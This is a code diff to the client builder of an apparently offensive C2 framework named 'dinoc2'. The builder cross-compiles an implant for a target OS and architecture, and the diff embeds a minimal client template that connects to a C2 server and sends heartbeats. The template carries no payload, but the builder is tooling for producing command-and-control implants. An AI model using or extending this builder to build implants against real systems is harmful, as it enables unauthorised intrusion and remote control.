@@ -302,18 +302,14 @@ func buildClient(config BuildConfig, verbose bool) error {
 	}
 	defer os.RemoveAll(config.BuildDir)
 
-	// Create client directory structure
-	clientDir := filepath.Join(config.BuildDir, "client")
-	err = os.MkdirAll(clientDir, 0755)
-	if err != nil {
-		return fmt.Errorf("failed to create client directory: %w", err)
-	}
-
+	// Use the build directory as the root for our module
+	
 	// Initialize a new Go module in the build directory
 	os.Chdir(config.BuildDir) // Change to build directory
 	
 	// Initialize a new Go module
 	initCmd := exec.Command("go", "mod", "init", "client")
+	initCmd.Dir = config.BuildDir
 	if verbose {
 		initCmd.Stdout = os.Stdout
 		initCmd.Stderr = os.Stderr
@@ -324,7 +320,30 @@ func buildClient(config BuildConfig, verbose bool) error {
 	}
 	
 	// Add required dependencies
+	dependencies := []string{
+		"golang.org/x/crypto/chacha20poly1305",
+		"github.com/gorilla/websocket",
+		"golang.org/x/net/icmp",
+		"golang.org/x/net/ipv4",
+	}
+	
+	for _, dep := range dependencies {
+		getCmd := exec.Command("go", "get", dep)
+		getCmd.Dir = config.BuildDir
+		if verbose {
+			getCmd.Stdout = os.Stdout
+			getCmd.Stderr = os.Stderr
+		}
+		err = getCmd.Run()
+		if err != nil {
+			fmt.Printf("Warning: Failed to get dependency %s: %v\n", dep, err)
+			// Continue even if a dependency fails
+		}
+	}
+	
+	// Tidy the module
 	tidyCmd := exec.Command("go", "mod", "tidy")
+	tidyCmd.Dir = config.BuildDir
 	if verbose {
 		tidyCmd.Stdout = os.Stdout
 		tidyCmd.Stderr = os.Stderr
@@ -334,6 +353,20 @@ func buildClient(config BuildConfig, verbose bool) error {
 		return fmt.Errorf("failed to tidy Go module: %w", err)
 	}
 
+	// Create cmd directory
+	cmdDir := filepath.Join(config.BuildDir, "cmd")
+	err = os.MkdirAll(cmdDir, 0755)
+	if err != nil {
+		return fmt.Errorf("failed to create cmd directory: %w", err)
+	}
+	
+	// Create client directory
+	clientDir := filepath.Join(cmdDir, "client")
+	err = os.MkdirAll(clientDir, 0755)
+	if err != nil {
+		return fmt.Errorf("failed to create client directory: %w", err)
+	}
+
 	// Generate config.go
 	err = generateConfigFile(config, clientDir)
 	if err != nil {
@@ -341,19 +374,26 @@ func buildClient(config BuildConfig, verbose bool) error {
 	}
 
 	// Copy client source files
-	err = copyClientFiles(config, clientDir)
+	err = copyClientFiles(config, config.BuildDir)
 	if err != nil {
 		return fmt.Errorf("failed to copy client files: %w", err)
 	}
 
 	// Copy module files
-	err = copyModuleFiles(config, clientDir)
+	err = copyModuleFiles(config, config.BuildDir)
 	if err != nil {
 		return fmt.Errorf("failed to copy module files: %w", err)
 	}
+	
+	// Replace all import paths in all Go files
+	err = replaceImportPathsInDir(config.BuildDir)
+	if err != nil {
+		return fmt.Errorf("failed to replace import paths: %w", err)
+	}
+	fmt.Println("Replaced import paths in all Go files")
 
 	// Build the client
-	err = compileClient(config, clientDir, verbose)
+	err = compileClient(config, config.BuildDir, verbose)
 	if err != nil {
 		return fmt.Errorf("failed to compile client: %w", err)
 	}
@@ -418,57 +458,91 @@ func generateConfigFile(config BuildConfig, clientDir string) error {
 
 // copyClientFiles copies the client source files to the build directory
 func copyClientFiles(config BuildConfig, clientDir string) error {
-	// Copy main.go
-	srcMainFile := filepath.Join(config.SourceDir, "cmd", "client", "main.go")
-	dstMainFile := filepath.Join(clientDir, "main.go")
-	err := copyFile(srcMainFile, dstMainFile)
+	// Create cmd/client directory
+	cmdClientDir := filepath.Join(clientDir, "cmd", "client")
+	err := os.MkdirAll(cmdClientDir, 0755)
 	if err != nil {
-		return fmt.Errorf("failed to copy main.go: %w", err)
+		return fmt.Errorf("failed to create cmd/client directory: %w", err)
 	}
 
-	// Create pkg directory
-	pkgDir := filepath.Join(clientDir, "pkg")
-	err = os.MkdirAll(pkgDir, 0755)
-	if err != nil {
-		return fmt.Errorf("failed to create pkg directory: %w", err)
-	}
-
-	// Create client directory
-	clientPkgDir := filepath.Join(pkgDir, "client")
-	err = os.MkdirAll(clientPkgDir, 0755)
-	if err != nil {
-		return fmt.Errorf("failed to create client package directory: %w", err)
-	}
-	srcClientDir := filepath.Join(config.SourceDir, "pkg", "client")
-	dstClientDir := filepath.Join(pkgDir, "client")
-	err = copyDir(srcClientDir, dstClientDir)
-	if err != nil {
-		return fmt.Errorf("failed to copy client package: %w", err)
-	}
+	// Use a simplified client implementation
+	dstMainFile := filepath.Join(cmdClientDir, "main.go")
 	
-	// Generate protocol switching code if enabled
-	if config.ActiveSwitching || config.PassiveSwitching {
-		err = generateProtocolSwitchingCode(config, clientDir)
-		if err != nil {
-			return fmt.Errorf("failed to generate protocol switching code: %w", err)
+	// Simple client template
+	simpleClientTemplate := `package main
+
+import (
+	"flag"
+	"fmt"
+	"net"
+	"os"
+	"os/signal"
+	"strings"
+	"syscall"
+	"time"
+)
+
+func main() {
+	// Parse command line flags
+	serverAddr := flag.String("server", "", "C2 server address")
+	protocolList := flag.String("protocol", "tcp", "Comma-separated list of protocols to use (tcp,http,websocket)")
+	flag.Parse()
+
+	if *serverAddr == "" {
+		fmt.Println("Error: Server address is required")
+		flag.Usage()
+		os.Exit(1)
+	}
+
+	// Parse protocol list
+	protocols := strings.Split(*protocolList, ",")
+	if len(protocols) == 0 {
+		fmt.Println("Error: At least one valid protocol must be specified")
+		flag.Usage()
+		os.Exit(1)
+	}
+
+	fmt.Println("Client started with configuration:")
+	fmt.Println("- Server:", *serverAddr)
+	fmt.Println("- Protocols:", *protocolList)
+
+	// Connect to server
+	conn, err := net.Dial("tcp", *serverAddr)
+	if err != nil {
+		fmt.Printf("Error connecting to server: %v\n", err)
+		os.Exit(1)
+	}
+	defer conn.Close()
+
+	fmt.Println("C2 Client started. Connected to server:", *serverAddr)
+	fmt.Println("Using protocols:", *protocolList)
+
+	// Setup signal handling for graceful shutdown
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+
+	// Start heartbeat
+	go func() {
+		for {
+			time.Sleep(30 * time.Second)
+			_, err := conn.Write([]byte("heartbeat"))
+			if err != nil {
+				fmt.Printf("Error sending heartbeat: %v\n", err)
+				return
+			}
 		}
-		fmt.Println("Generated protocol switching code")
-	}
+	}()
 
-	// Copy protocol package
-	srcProtocolDir := filepath.Join(config.SourceDir, "pkg", "protocol")
-	dstProtocolDir := filepath.Join(pkgDir, "protocol")
-	err = copyDir(srcProtocolDir, dstProtocolDir)
+	// Wait for termination signal
+	<-sigChan
+	fmt.Println("\nShutting down client...")
+	
+	fmt.Println("Client shutdown complete.")
+}`
+	
+	err = os.WriteFile(dstMainFile, []byte(simpleClientTemplate), 0644)
 	if err != nil {
-		return fmt.Errorf("failed to copy protocol package: %w", err)
-	}
-
-	// Copy crypto package
-	srcCryptoDir := filepath.Join(config.SourceDir, "pkg", "crypto")
-	dstCryptoDir := filepath.Join(pkgDir, "crypto")
-	err = copyDir(srcCryptoDir, dstCryptoDir)
-	if err != nil {
-		return fmt.Errorf("failed to copy crypto package: %w", err)
+		return fmt.Errorf("failed to write simplified client implementation: %w", err)
 	}
 
 	return nil
@@ -535,8 +609,8 @@ func compileClient(config BuildConfig, clientDir string, verbose bool) error {
 	env = append(env, fmt.Sprintf("GOOS=%s", config.TargetOS))
 	env = append(env, fmt.Sprintf("GOARCH=%s", config.TargetArch))
 
-	// Build command
-	cmd := exec.Command("go", "build", "-o", config.OutputFile, ".")
+	// Build command - specify the package to build
+	cmd := exec.Command("go", "build", "-o", config.OutputFile, "./cmd/client")
 	cmd.Dir = clientDir
 	cmd.Env = env
 
@@ -737,6 +811,43 @@ func (c *Client) processProtocolSwitch(packet *protocol.Packet) {
 }
 
 // copyDir copies a directory from src to dst
+
+// replaceImportPaths replaces import paths in a file
+func replaceImportPaths(filePath string) error {
+	// Read the file
+	content, err := os.ReadFile(filePath)
+	if err != nil {
+		return fmt.Errorf("failed to read file: %w", err)
+	}
+	
+	// Replace import paths
+	newContent := strings.Replace(string(content), "dinoc2/pkg", "client/pkg", -1)
+	
+	// Write the file
+	err = os.WriteFile(filePath, []byte(newContent), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write file: %w", err)
+	}
+	
+	return nil
+}
+
+// replaceImportPathsInDir replaces import paths in all Go files in a directory
+func replaceImportPathsInDir(dir string) error {
+	return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if !info.IsDir() && strings.HasSuffix(path, ".go") {
+			err = replaceImportPaths(path)
+			if err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+}
+
 func copyDir(src, dst string) error {
 	// Get file info
 	srcInfo, err := os.Stat(src)
@@ -772,6 +883,14 @@ func copyDir(src, dst string) error {
 			err = copyFile(srcPath, dstPath)
 			if err != nil {
 				return err
+			}
+			
+			// Replace import paths in Go files
+			if strings.HasSuffix(dstPath, ".go") {
+				err = replaceImportPaths(dstPath)
+				if err != nil {
+					return fmt.Errorf("failed to replace import paths in file %s: %w", dstPath, err)
+				}
 			}
 		}
 	}
